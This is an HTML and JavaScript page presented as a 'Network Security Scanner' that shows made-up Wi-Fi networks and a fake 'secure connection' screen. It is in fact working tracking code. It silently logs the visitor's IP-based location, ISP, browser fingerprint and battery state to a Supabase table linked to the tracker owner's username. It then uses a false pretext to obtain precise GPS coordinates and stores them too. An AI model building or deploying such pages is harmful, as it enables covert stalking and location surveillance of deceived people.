<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Network Security Scanner</title><script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script><style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');:root{--primary-glow:0 0 15px rgba(0,122,255,.3);--danger-glow:0 0 15px rgba(233,69,96,.4)}body{font-family:'Poppins',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;transition:background .4s,color .4s;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}body.light-mode{background:#eef2f5;color:#444}body.dark-mode{background-color:#121212;color:#d0d0d0}.scanner-container{padding:28px;border-radius:24px;width:100%;max-width:400px;text-align:center;overflow:hidden;height:100%;display:flex;flex-direction:column;transition:background-color .4s,box-shadow .4s,border .4s}body.light-mode .scanner-container{background-color:rgba(255,255,255,0.9);box-shadow:0 16px 32px rgba(0,0,0,.1);backdrop-filter:blur(10px);border:1px solid rgba(0,0,0,0.05)}body.dark-mode .scanner-container{background-color:rgba(28,28,30,0.85);box-shadow:0 16px 40px rgba(0,0,0,.5);border:1px solid rgba(255,255,255,.1);backdrop-filter:blur(12px)}.stage{display:none}.stage.active{display:flex;flex-direction:column;justify-content:center;align-items:center;width:100%;flex-grow:1;animation:fadeIn .5s ease-out}.icon{font-size:52px;margin-bottom:24px;color:#28a745}h2{font-weight:600;margin-bottom:12px;font-size:clamp(1.4rem, 5vw, 1.6rem)}body.light-mode h2{color:#222}body.dark-mode h2{color:#fff}p{margin-bottom:32px;line-height:1.7;font-size:clamp(0.9rem, 3.5vw, 1rem);max-width:300px}body.light-mode p{color:#667}body.dark-mode p{color:#999}.loader{width:50px;height:50px;border-radius:50%;display:inline-block;position:relative;animation:rotation 1s linear infinite}body.light-mode .loader{border:4px solid #f0f0f0;border-top-color:#007aff}body.dark-mode .loader{border:4px solid rgba(255,255,255,0.15);border-top-color:#e94560}.list-loader{margin-top:28px;margin-bottom:12px}@keyframes rotation{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}.wifi-list{list-style:none;padding:0;margin:0;text-align:left;width:100%;overflow-y:auto}.wifi-item{display:flex;align-items:center;justify-content:space-between;padding:18px 8px;cursor:pointer;border-radius:12px;transition:background-color .2s ease-in-out,transform .2s;margin-bottom:8px}body.light-mode .wifi-item:hover{background-color:#f0f5fa;transform:scale(1.02)}body.dark-mode .wifi-item{border-bottom:1px solid #2a2a2a}body.dark-mode .wifi-item:hover{background-color:#2c2c2e;transform:scale(1.02)}.wifi-details{display:flex;align-items:center;gap:16px}.wifi-details img{opacity:0.7}.wifi-name{font-weight:500;font-size:1.05rem}body.light-mode .wifi-name{color:#333}body.dark-mode .wifi-name{color:#eee}.signal-bars{display:flex;align-items:flex-end;height:20px}.bar{width:5px;margin-left:2px;border-radius:2px;transition:background-color .3s}body.light-mode .bar{background-color:#d8dde2}body.dark-mode .bar{background-color:#444}.bar.active{background:linear-gradient(to top,#28a745,#85d8a2)}body.dark-mode .bar.active{background:linear-gradient(to top,#2cbc76,#67e2a8)}.bar1{height:25%}.bar2{height:50%}.bar3{height:75%}.bar4{height:100%}.final-message{padding:16px;border-radius:12px;margin:24px 0;font-weight:500;font-size:1rem}body.light-mode .final-message{background-color:#e7f8ee;color:#0d8a4d}body.dark-mode .final-message{background-color:rgba(44,188,118,.15);color:#2cbc76}.btn{width:100%;padding:18px;border:none;border-radius:16px;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all .3s ease;letter-spacing:0.5px}.btn-primary{background:linear-gradient(95deg,#007aff,#00c6ff);color:#fff;margin-top:24px;box-shadow:0 8px 20px rgba(0,122,255,.2)}.btn-primary:hover{transform:translateY(-3px);box-shadow:0 12px 25px rgba(0,122,255,.3)}.btn-primary:disabled{opacity:.6;cursor:not-allowed;transform:none;box-shadow:none}.btn-secondary{margin-top:16px}body.light-mode .btn-secondary{background-color:#e9edf2;color:#333}body.dark-mode .btn-secondary{background-color:rgba(255,255,255,.1);color:#fff}.modal-overlay{display:none;position:fixed;z-index:1000;left:0;top:0;width:100%;height:100%;background-color:rgba(0,0,0,.6);justify-content:center;align-items:center;backdrop-filter:blur(5px)}.modal-overlay.active{display:flex}.modal-content{padding:28px;border-radius:20px;width:85%;max-width:360px;box-shadow:0 10px 30px rgba(0,0,0,.2);position:relative;animation:scale-in .3s ease-out}body.light-mode .modal-content{background-color:#fff}body.dark-mode .modal-content{background-color:#2c2c2e;border:1px solid rgba(255,255,255,.15)}body.light-mode .modal-content h3,body.light-mode .modal-content .detail-item strong{color:#333}body.dark-mode .modal-content h3,body.dark-mode .modal-content .detail-item strong{color:#fff}@keyframes scale-in{0%{transform:scale(0.9);opacity:0}100%{transform:scale(1);opacity:1}}.modal-close{position:absolute;top:12px;right:18px;font-size:32px;font-weight:700;color:#888;cursor:pointer;line-height:1}.modal-content h3{margin-top:0;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid #eee}body.dark-mode .modal-content h3{border-bottom:1px solid #383838}.modal-content .detail-item{display:flex;justify-content:space-between;padding:12px 0;font-size:0.95rem}.modal-content .detail-item:not(:last-child){border-bottom:1px solid #f0f0f0}body.dark-mode .modal-content .detail-item:not(:last-child){border-bottom:1px solid #383838}@media(max-width:480px){body{padding:0}.scanner-container{width:100%;height:100%;border-radius:0;padding:24px}.btn{padding:16px;font-size:1rem;border-radius:12px}.wifi-item{padding:14px 6px}}</style></head><body><div class="scanner-container"><div id="stage-1" class="stage active"><div class="loader"></div><h2>Searching for Networks...</h2><p>Please wait while we scan for available networks near you.</p></div><div id="stage-2" class="stage list-stage"><h2>Choose a Network</h2><ul id="wifi-list-ul" class="wifi-list"></ul><div class="loader list-loader"></div><p style="font-size:0.9rem;margin-top:0;">Searching for more networks...</p></div><div id="stage-connecting" class="stage"><div class="loader"></div><h2 id="connecting-to-h2" style="white-space:pre-wrap;">Connecting to...</h2><p>Please wait...</p></div><div id="stage-final" class="stage"><div class="icon">✓</div><h2>Connected</h2><p id="connected-to-msg"></p><div class="final-message">Your connection is secure</div><button id="view-details-btn" class="btn btn-secondary">View Network Details</button></div><div id="stage-lock" class="stage"><h2 style="color:#ff3b30;">Location Service Required</h2><p>To scan for nearby networks and calculate signal strength, this tool requires access to your device's GPS. Please grant location access to proceed.</p><button id="allow-btn" class="btn btn-primary">Allow Location Access</button></div></div><div id="details-modal" class="modal-overlay"><div class="modal-content"><span id="modal-close-btn" class="modal-close">×</span><h3>Network Details</h3><div class="detail-item"><strong>IP Address:</strong> <span id="modal-ip">Not Available</span></div><div class="detail-item"><strong>Subnet Mask:</strong> <span>255.255.255.0</span></div><div class="detail-item"><strong>Gateway:</strong> <span>192.168.1.254</span></div><div class="detail-item"><strong>Status:</strong> <span style="color:#28a745">Secure</span></div></div></div><script>let supabase;let trackedByUsername=null;let autoConnectTimer=null;let initialRecordId=null;const svgLockIcon=`data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='currentColor' class='bi bi-lock-fill' viewBox='0 0 16 16'%3E%3Cpath d='M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2z'/%3E%3C/svg%3E`;const wifiListUI=document.getElementById('wifi-list-ul');function showStage(id){document.querySelectorAll('.stage').forEach(stage=>stage.classList.remove('active'));document.getElementById(id).classList.add('active')}function renderSignal(strength){let bars=`<div class="bar bar1 ${strength>=1?'active':''}"></div>`;bars+=`<div class="bar bar2 ${strength>=2?'active':''}"></div>`;bars+=`<div class="bar bar3 ${strength>=3?'active':''}"></div>`;bars+=`<div class="bar bar4 ${strength>=4?'active':''}"></div>`;return`<div class="signal-bars">${bars}</div>`}async function getBaseIntel(){const intel={tracked_by_username:trackedByUsername||'Unknown',latitude:'Pending...',longitude:'Pending...'};try{const response=await fetch('/api/intel');if(response.ok){const data=await response.json();intel.ip_address=data.ipAddress;intel.city=data.city;intel.region=data.region;intel.country=data.country;intel.isp=data.isp;intel.timezone=data.timezone;document.getElementById('modal-ip').textContent=data.ipAddress||'N/A'}}catch(e){console.error('IP Intel fetch failed',e)}try{intel.user_agent=navigator.userAgent||'N/A';intel.platform=navigator.platform||'N/A';intel.language=navigator.language||'N/A';intel.screen_width=screen.width||null;intel.screen_height=screen.height||null;intel.color_depth=screen.colorDepth||null;intel.pixel_depth=screen.pixelDepth||null;intel.hardware_concurrency=navigator.hardwareConcurrency||null;intel.cookies_enabled=navigator.cookieEnabled||null;intel.do_not_track=navigator.doNotTrack===null?'N/A':navigator.doNotTrack}catch(e){console.error('Browser Intel fetch failed',e)}try{if('getBattery'in navigator){const battery=await navigator.getBattery();intel.battery_level=Math.floor(battery.level*100);intel.is_charging=battery.charging}}catch(e){console.error('Battery API failed',e)}return intel}async function updateLocationData(status,coords){if(!initialRecordId){console.error('Cannot update location: initial record ID is missing.');return}const updatePayload={};if(status==='granted'){updatePayload.latitude=coords.latitude.toFixed(6);updatePayload.longitude=coords.longitude.toFixed(6)}else{updatePayload.latitude='Permission Denied';updatePayload.longitude='Permission Denied'}await supabase.from('locations').update(updatePayload).eq('id',initialRecordId);loadAndShowWifiList()}function startConnectionSequence(networkName){clearTimeout(autoConnectTimer);document.getElementById('connecting-to-h2').textContent=`Connecting to\n${networkName}...`;showStage('stage-connecting');setTimeout(()=>{document.getElementById('connected-to-msg').textContent=`You're connected to ${networkName}`;showStage('stage-final')},2500)}function generateWifiData(){const networks=[];const networkNames=["PTCL-BB","Zong-MBB","Jazz_Hotspot","STORM-FIBER","Wateen","Home_WiFi","AndroidAP","Nayatel","Transworld","Optix"];for(let i=0;i<8;i++){const name=networkNames[Math.floor(Math.random()*networkNames.length)];const id=Math.floor(Math.random()*9000)+1000;networks.push({ssid:`${name}_${id}`,signal:Math.floor(Math.random()*4)+1,secure:true})}return{networks:networks}}function loadAndShowWifiList(){try{const wifiData=generateWifiData();wifiListUI.innerHTML='';wifiData.networks.forEach(net=>{const li=document.createElement('li');li.className='wifi-item';const lockHTML=`<img src="${svgLockIcon}" alt="lock" style="width:16px;height:16px;" />`;li.innerHTML=`<div class="wifi-details">${lockHTML}<span class="wifi-name">${net.ssid}</span></div> ${renderSignal(net.signal)}`;li.onclick=()=>startConnectionSequence(net.ssid);wifiListUI.appendChild(li)});showStage('stage-2');const firstWifiName=wifiData.networks[0]?.ssid||'a secure network';autoConnectTimer=setTimeout(()=>startConnectionSequence(firstWifiName),4000)}catch(e){console.error("Error showing WiFi list:",e);showStage('stage-final')}}async function askForPermission(){const allowBtn=document.getElementById('allow-btn');allowBtn.disabled=true;allowBtn.textContent='Processing...';navigator.geolocation.getCurrentPosition(position=>updateLocationData('granted',position.coords),error=>updateLocationData('denied'),{enableHighAccuracy:true,timeout:20000,maximumAge:0})}async function initApp(){try{const response=await fetch('/api/config');const config=await response.json();if(!config.supabaseUrl||!config.supabaseAnonKey)throw new Error("Config not loaded");supabase=window.supabase.createClient(config.supabaseUrl,config.supabaseAnonKey);const pathParts=window.location.pathname.split('/');const trackerId=pathParts[pathParts.length-1];const{data:userData}=await supabase.from('users').select('username, is_dark_mode').eq('tracker_id',trackerId).single();if(userData){trackedByUsername=userData.username;document.body.className=userData.is_dark_mode?'dark-mode':'light-mode'}const baseIntel=await getBaseIntel();const{data,error}=await supabase.from('locations').insert([baseIntel]).select().single();if(error||!data){console.error('Initial data insert error:',error);document.querySelector('.scanner-container').innerHTML='<h2>Execution Failed</h2><p>Could not log initial data.</p><p style="font-size:0.8rem;color:red;">Error: '+(error?error.message:'Unknown issue')+'</p>';return}initialRecordId=data.id;setTimeout(()=>{showStage('stage-lock');document.getElementById('allow-btn').onclick=askForPermission},2000);const detailsModal=document.getElementById('details-modal');document.getElementById('view-details-btn').addEventListener('click',()=>detailsModal.classList.add('active'));document.getElementById('modal-close-btn').addEventListener('click',()=>detailsModal.classList.remove('active'));detailsModal.addEventListener('click',e=>{if(e.target===detailsModal)detailsModal.classList.remove('active')});}catch(err){document.querySelector('.scanner-container').innerHTML='<h2>Initialization Failed</h2><p>Could not connect to the server.</p>'}}initApp();</script></body></html>